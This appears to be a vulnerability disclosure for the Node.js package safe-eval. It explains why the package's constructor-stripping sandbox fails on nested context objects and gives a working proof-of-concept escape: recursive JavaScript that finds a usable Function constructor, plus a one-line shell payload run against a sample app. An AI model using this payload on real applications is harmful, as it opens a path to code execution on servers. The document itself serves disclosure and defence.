Github: https://github.com/hacksparrow/safe-eval

Npm: https://www.npmjs.com/package/safe-eval

Safe-eval module uses the standard nodejs “VM” module to execute user’s supplied javascript code in safe way, the module performs that by appending the following code to the user supplied input.

```

 (function() { 
 Function = undefined; 
 const keys = Object.getOwnPropertyNames(this).concat(['constructor']); 
 keys.forEach((key) => { 
 const item = this[key]; 
 if (!item || typeof item.constructor !== 'function') return; 
 this[key].constructor = undefined; 
 }); 
 })();
```
This protection loop over all the build in javascript objects and write its constructor value to “undefined” which prevent the user from calling any constructor.

Weakness
---------
The above code doesn’t recursively check “this” which means that if there is a variable in the context like the following one the above code will not be able to erase the x.v.constructor.

```

 var context = { 
 x: {v: 
	function() { 
		return 1 
		} 
	} 
 };
```
Application using safe-eval usually pass the variables the code needs into the context variable, those variables will be available for the sandbox to access.

If the variable contains a function declaration under a 2nd degree (or more) object, we can escape the sandbox by referencing to this variable constructor.

Exploit
---------
The following exploit I wrote will loop over all the declared variables in the sandbox context recursively and once it detects the above situation it will use the function constructor to escape the sandbox.

```

 var stack = []; 
 
 function trace(context) { 
	if (context === null) return; 
		const keys = Object.getOwnPropertyNames(context); 
		for (var i = 0; i < keys.length; i++) { 
			key = keys[i] 
			if (typeof context[key] === 'object') { 
				result = trace(context[key]); 
			} else if (typeof context[key] === 'undefined' || typeof context[key].constructor === 'undefined') continue; 
	else if (typeof context[key].constructor.constructor === 'function') { 
	stack.push(context[key]); 
		} 
 
	} 
 } 
 
 trace(global); 
 var suc = []; 
 for (var i = 0; i < stack.length; i++) { 
 try { 
 stack[i].constructor('global')(); 
 suc.push(stack[i]); 
 } catch (e) { 
 
 } 
 }
```
Now lets assume that the application using safe-eval is passing a context in a vulnerable way as below.

```

 root@kali:~/Desktop/eval# cat safe.js 
 
 var safeeval = require('./safe-eval-master'); 
 var src = process.argv[2]; 
 const sandbox = { x: {v:function(){return 2}} }; 
 console.log(safeeval(src,sandbox))
```
we will pass the payload like this

```
root@kali:~/Desktop/eval# nodejs safe.js "1;var stack = [];function trace(context){console.log(context);if (context===null) return;const keys = Object.getOwnPropertyNames(context);for(var i=0;i<keys.length;i++){key = keys[i];if(typeof context[key] === 'object'){result = trace(context[key]);}else if (typeof context[key] === 'undefined' || typeof context[key].constructor === 'undefined') continue;else if( typeof context[key].constructor.constructor === 'function'){stack.push(context[key]);}}};trace(this);var suc=[];for(var i=0;i<stack.length;i++){try{stack[i].constructor('global')();suc.push(stack[i]) }catch(e){ }};suc"
```
This payload will return the constructor of the function “x.v”, in order to gain access to the process object and gain RCE we can do something like this.

[IMG]
